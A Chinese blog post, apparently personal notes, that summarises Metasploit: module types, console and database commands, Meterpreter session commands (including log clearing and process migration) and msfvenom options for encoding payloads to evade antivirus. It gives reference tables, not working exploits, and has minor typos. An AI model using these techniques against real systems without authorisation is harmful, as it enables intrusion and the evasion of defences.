    工具篇之Metasploit
    发表于 2020-05-19| 更新于 2020-05-19
    阅读量:

    Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。

    一、启动MSF

    二、MSF模块

    模块名 介绍
    Auxiliaries 辅助模块，用于扫描、发现漏洞、探测信息等工作
    Payloads 攻击载荷模块，目标系统被渗透攻击之后需要执行的代码
    Exploit 渗透攻击模块，利用已发现的漏洞对远程目标系统进行攻击、植入并运行攻击载荷，从而控制目标系统
    Encoders 编码器模块，将攻击载荷进行编码，绕过杀软
    NOPS 空指令模块，为了避免攻击载荷在执行的过程中出现随机地址和返回地址错误而在执行shellcode之前加入一些空指令，使得在执行shellcode时有一个较大的安全着陆区
    Post 后渗透攻击模块，在受控系统中进行各种各样的后渗透攻击动作，比如获取敏感信息、进一步拓展、实施跳板攻击等

    三、MSF常用命令

    • 核心命令
    命令 介绍
    get 获取参数值
    getg 获取全局参数值
    set 设置参数值
    setg 设置全局参数值
    load 加载插件
    route 配置路由
    sessions 会话信息
    exit 退出msf
    • 模块命令
    命令 介绍
    advanced 高级配置项
    back 返回上一层
    info 显示信息
    options 配置项
    reload_all 重新从默认路径导入插件
    search 搜索模块
    show 显示
    use 使用模块
    • 工作命令
    命令 介绍
    handler 开启一个payload处理器作为job
    jobs 显示工作
    kill 停止某个job
    rename_job 重命名job
    • 数据库备份命令
    命令 介绍
    workspace 工作空间
    db_export 导出数据库结果
    db_import 将结果导入到数据库中
    db_nmap MSF调用nmap
    hosts 列出所有主机信息
    services 列出所有服务信息
    vulns 列出所有漏洞信息
    db_status 数据库连接状态

    五、Meterpreter

    Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个MeterpreterShell的链接。

    5.1 基础命令

    命令 介绍
    background 让会话放在后台运行
    sessions 获取会话
    shell 切换windows下cmd终端
    upload 上传
    dowmload 下载
    ipconfig 查看目标的网络信息
    portwd 端口转发
    route 显示路由信息
    ps 获取进程信息
    migrate 迁移进程
    getpid 获取当前会话进程的pid值
    getuid 获取当前会话的用户名
    kill 停止进程
    sysinfo 显示系统信息
    shutdown 关闭目标设备
    clearav 清除日志

    六、Msfvenom

    Msfpayload用于从攻击载荷中生成二进制文件，Msfencode则用于使用不同编码技术对该二进制文件进行编码。Msfvenom工具则结合了二者的功能，并在生成可隐蔽执行漏洞利用代码方面发挥重要作用。

    6.1 常见参数

    参数 介绍
    -l,–list 列出[type]的所有模块。类型包括：有效载荷、编码器、nops、平台、archs、加密、格式等
    -p,–paylist 指定payload
    -f,–format 输出格式
    -e,–encoder 设置编码器
    –smallest 生成最小的有效载荷
    –encrypt 设置shellcode编码或加密类型
    –encrypt-key 密钥
    –encrypt-iv 初始化encrypt
    -a,–arch 设置架构
    –platform 设置payload的目标平台
    -o,–out 指定输出路径
    -b,–bad-chars 去除坏字符
    -n,–nopsled 在有效载荷上添加[length]大小的nopsled
    –pad-nops 使用由-n<length>指定的nopsled大小作为总有效负载带下，从而执行减法以预先填充数量(nops减去有效负载长度)
    -s,–space 生成的有效负载的最大大小
    –encoder-space 生成的有效负载的最大大小
    -i,–iterations 编码次数
    -c,–add-code 指定要包含的win32 shellcode文件
    -x,–template 指定要用作模板的自定义可执行文件
    -k,–keep 保留–template行为并将有效负载注入新线程
    -v,–var-name 指定用于某些输出格式的自定义变量名称
    -t,–timeout 指定用于某些输出格式的自定义变量名称
    -h,–help 显示帮助信息
